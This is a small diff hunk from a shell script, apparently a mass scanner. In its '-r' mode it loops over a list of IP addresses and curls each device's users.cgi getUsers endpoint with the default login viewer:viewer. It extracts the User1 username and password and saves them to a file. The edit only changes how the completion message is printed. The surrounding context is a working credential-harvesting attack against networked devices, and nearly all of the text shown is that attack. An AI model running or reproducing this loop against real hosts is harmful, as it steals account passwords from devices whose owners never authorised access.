@@ -35,7 +35,7 @@ if [ "$1" == "-r" ]; then
     curl -s --max-time 10 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)' >> $4 2>&1
     printf "\n" >> $4 2>&1
   done < "$2"
-  printf "\nDONE! Saved to $4!\n"
+  echo "DONE! Saved to $4!"
   exit 0
 fi
 
